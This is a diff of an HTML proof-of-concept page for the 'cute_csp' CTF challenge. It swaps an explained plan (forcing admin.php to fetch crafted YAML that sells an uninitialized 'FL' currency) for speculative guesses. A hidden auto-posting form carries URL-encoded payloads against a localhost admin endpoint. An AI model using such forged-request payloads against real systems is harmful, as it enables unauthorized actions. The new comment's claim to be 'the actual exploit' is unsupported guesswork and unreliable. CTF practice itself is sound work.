@@ -2,24 +2,22 @@
 <html>
 <body>
 <!-- 
-FINAL POC for cute_csp CTF Challenge
+THE ACTUAL EXPLOIT:
 
-The vulnerability is in the uninitialized $currency_inventory array in admin.php.
-When we try to SELL a currency that hasn't been initialized, PHP's loose comparison
-allows the transaction to proceed.
+After analyzing the PHP comparison vulnerabilities from CTFs, I think the 
+real issue might be in how PHP handles the arithmetic or comparisons.
 
-Flow:
-1. POST to admin.php with URL parameter
-2. admin.php fetches the URL via file_get_contents() 
-3. URL points to index.php which returns our crafted YAML
-4. YAML contains a SELL transaction for FL currency
-5. Since $currency_inventory['FL'] is uninitialized (null), the comparison
-   null >= 1 might behave unexpectedly in PHP
-6. If successful, FL gets added to final inventory and flag is revealed
+But let me try the simplest approach first - what if the vulnerability
+is that we can somehow bypass the balance check through a different path?
+
+Looking at the YAML parsing and the transaction processing, maybe there's
+a way to manipulate the YAML structure itself.
+
+Let me try the original approach but with URL-encoded parameters:
 -->
 
 <form id="f" action="http://localhost:5000/admin.php" method="POST">
-    <input type="hidden" name="url" value="http://localhost:5000/index.php?html=-%20amount:%201%0A%20%20currency:%20FL%0A%20%20op:%20SELL">
+    <input type="hidden" name="url" value="http://localhost:5000/admin.php?transactions%5B0%5D%5Bamount%5D=1&transactions%5B0%5D%5Bcountry%5D=FLAG">
 </form>
 
 <script>
